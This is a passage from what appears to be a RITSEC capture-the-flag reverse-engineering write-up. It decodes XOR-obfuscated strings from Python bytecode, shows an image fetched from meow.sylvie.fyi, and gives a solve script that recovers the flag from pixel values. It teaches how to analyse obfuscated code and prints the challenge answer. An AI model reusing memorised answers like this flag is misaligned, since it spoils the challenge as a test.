# Flags:             0x00000073 (NOFREE | GENERATOR | NESTED | NEWLOCALS | OPTIMIZED)
# First Line:        10
# Constants:
#    0: 69
#    1: None
# Names:
#    0: chr
# Varnames:
#	.0, i
# Positional arguments:
#	.0
# Local variables:
#    1: i
               0 GEN_START            0

 10:           2 LOAD_FAST            (.0)
         >>    4 FOR_ITER             (to 24)
               6 STORE_FAST           (i)
               8 LOAD_GLOBAL          (chr)
              10 LOAD_FAST            (i)
              12 LOAD_CONST           (69)
              14 BINARY_XOR
              16 CALL_FUNCTION        (1 positional argument)
              18 YIELD_VALUE
              20 POP_TOP
              22 JUMP_ABSOLUTE        (to 4)
         >>   24 LOAD_CONST           (None)
              26 RETURN_VALUE
```

There are more strings to XOR:
```python
>>> s = ''.join(chr(i ^ 67) for i in b'\x04\x06\x17cl07"7* l1*70& \x1c "7$*1/m3-$c\x0b\x17\x17\x13lrmrNI\x0b,07yc.&,4m0:/5*&m%:*NI\x00,--& 7*,-yc /,0&NINI')  
... print(s)  
...  
GET /static/ritsec_catgirl.png HTTP/1.1  
Host: meow.sylvie.fyi  
Connection: close

>>> s = ''.join(chr(i ^ 42) for i in b'GOE]\x04YSF\\CO\x04LSC')  
... print(s)  
...  
meow.sylvie.fyi
>>> s = ''.join(chr(i ^ 31) for i in b'rmzph%?')  
... print(s)  
...  
mreow:
>>> s = ''.join(chr(i ^ 17) for i in b'yxbb')  
... print(s)  
...  
hiss
```

It fetches an image from the response to the request:
```shell
GET /static/ritsec_catgirl.png HTTP/1.1  
Host: meow.sylvie.fyi  
Connection: close
```
Then it uses a hardcoded set of 64 pixel coordinates to extract data. Then it prompts the user for input and validates it matches the coordinate count and checks each character by XORing the R, G, and B values at those pixel positions.

Solve script:
```python
import requests
from PIL import Image
from io import BytesIO

# get the image
r = requests.get("https://meow.sylvie.fyi/static/ritsec_catgirl.png")
img = Image.open(BytesIO(r.content))
print(f"Image: {img.size}, mode: {img.mode}")

# pixel coords hardcoded in stage2 bytecode
coords = ((139,766),(136,759),(177,440),(95,810),(154,479),(136,758),(179,439),(95,808),(158,456),(136,758),(191,551),(99,796),(159,522),(136,758),(152,485),(155,458),(99,796),(95,809),(136,758),(95,808),(159,522),(136,758),(179,439),(95,808),(158,456),(191,551),(136,758),(155,458),(95,808),(159,512),(95,809),(136,758),(179,439),(95,808),(158,456),(136,758),(159,512),(155,458),(95,808),(158,456),(190,496),(153,479),(136,758),(195,443),(99,796),(156,456),(94,810),(136,758),(153,470),(94,810),(152,485),(152,485),(161,450),(191,551),(136,758),(153,479),(94,810),(154,463),(154,464),(159,512),(95,810),(158,521),(159,522),(97,786),(233,533))

flag = ""
for x, y in coords:
    r_val, g_val, b_val = img.getpixel((x, y))[:3]
    flag += chr(r_val ^ g_val ^ b_val)

print(f"Flag: {flag}")
```

Output:
```shell
python3 solve.py  
Image: (652, 839), mode: RGB  
Flag: RS{1f_y0u_r4n_th47_0n_y0ur_h0s7_y0u_sh0uld_m4k3_b3tter_d3cis1on5}
```

`RS{1f_y0u_r4n_th47_0n_y0ur_h0s7_y0u_sh0uld_m4k3_b3tter_d3cis1on5}`
